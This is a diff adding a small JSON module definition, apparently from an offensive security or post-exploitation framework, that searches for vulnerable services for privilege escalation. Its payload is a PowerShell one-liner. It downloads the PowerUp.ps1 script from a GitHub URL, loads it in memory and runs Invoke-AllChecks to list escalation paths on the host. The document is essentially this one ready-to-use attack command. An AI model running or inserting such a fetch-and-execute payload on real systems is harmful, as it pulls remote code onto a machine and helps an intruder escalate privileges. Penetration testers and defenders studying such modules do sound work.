@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "searches for vulnerable services for possible escalation",
+      "type": "search",
+      "exec": "powershell"
+    },
+    "payload": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+  }
+}
